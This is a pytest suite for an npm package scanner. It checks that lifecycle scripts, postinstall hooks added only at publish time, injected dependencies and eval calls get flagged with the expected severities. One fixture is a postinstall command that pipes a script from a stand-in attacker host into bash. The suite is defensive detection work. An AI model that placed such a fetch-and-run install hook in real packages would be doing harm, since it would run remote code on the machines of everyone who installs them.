from app.services import metadata_analyzer


def test_lifecycle_script_present_is_flagged():
    findings = metadata_analyzer.analyze_lifecycle_scripts({"postinstall": "node setup.js"})
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "LIFECYCLE_SCRIPT_PRESENT"
    assert findings[0]["severity"] == "MEDIUM"


def test_lifecycle_script_with_suspicious_command_is_high_severity():
    findings = metadata_analyzer.analyze_lifecycle_scripts({"postinstall": "curl http://evil.example.com/x.sh | bash"})
    assert findings[0]["severity"] == "HIGH"


def test_lifecycle_script_injected_at_publish_is_flagged_high():
    """A postinstall script that exists in the published package.json but was
    never in the source repository's package.json — i.e. injected only at
    publish time — is a stronger signal than a script that always existed.
    """
    published = {"postinstall": "node setup.js"}
    source = {"test": "jest"}  # no postinstall in source at all
    findings = metadata_analyzer.analyze_lifecycle_script_changes(published, source)
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "LIFECYCLE_SCRIPT_INJECTED"
    assert findings[0]["severity"] == "HIGH"


def test_lifecycle_script_unchanged_is_not_flagged():
    published = {"postinstall": "node setup.js"}
    source = {"postinstall": "node setup.js"}
    findings = metadata_analyzer.analyze_lifecycle_script_changes(published, source)
    assert findings == []


def test_lifecycle_script_changed_command_is_flagged_medium():
    published = {"postinstall": "node setup.js --flag"}
    source = {"postinstall": "node setup.js"}
    findings = metadata_analyzer.analyze_lifecycle_script_changes(published, source)
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "LIFECYCLE_SCRIPT_CHANGED"
    assert findings[0]["severity"] == "MEDIUM"


def test_lifecycle_script_changes_skipped_when_source_unavailable():
    findings = metadata_analyzer.analyze_lifecycle_script_changes({"postinstall": "node setup.js"}, None)
    assert findings == []


def test_dependency_injection_at_publish_is_flagged():
    findings = metadata_analyzer.analyze_dependency_changes(
        {"lodash": "^4.0.0", "shady-pkg": "^1.0.0"}, {"lodash": "^4.0.0"},
    )
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "DEPENDENCY_ADDED_AT_PUBLISH"
    assert "shady-pkg" in findings[0]["evidence"]


def test_dependency_version_mismatch_is_flagged_low():
    findings = metadata_analyzer.analyze_dependency_changes(
        {"lodash": "^4.17.21"}, {"lodash": "^4.17.0"},
    )
    assert findings[0]["rule_id"] == "DEPENDENCY_VERSION_MISMATCH"
    assert findings[0]["severity"] == "LOW"


def test_dependency_changes_skipped_when_source_unavailable():
    assert metadata_analyzer.analyze_dependency_changes({"lodash": "^4.0.0"}, None) == []


def test_declared_entrypoint_missing_is_flagged():
    findings = metadata_analyzer.analyze_declared_entrypoints({"main": "index.js"}, {"other.js"})
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "DECLARED_ENTRYPOINT_MISSING"


def test_declared_entrypoint_present_is_not_flagged():
    findings = metadata_analyzer.analyze_declared_entrypoints({"main": "index.js"}, {"index.js"})
    assert findings == []


def test_scan_code_patterns_detects_eval(tmp_path):
    (tmp_path / "evil.js").write_text("eval(userInput)")
    findings = metadata_analyzer.scan_code_patterns(tmp_path, ["evil.js"])
    categories = {f["category"] for f in findings}
    assert "dynamic_code_execution" in categories
    assert all(f["rule_id"].startswith("CODE_PATTERN_") for f in findings)


def test_scan_code_patterns_ignores_non_js_files(tmp_path):
    (tmp_path / "readme.md").write_text("eval(userInput)")
    findings = metadata_analyzer.scan_code_patterns(tmp_path, ["readme.md"])
    assert findings == []
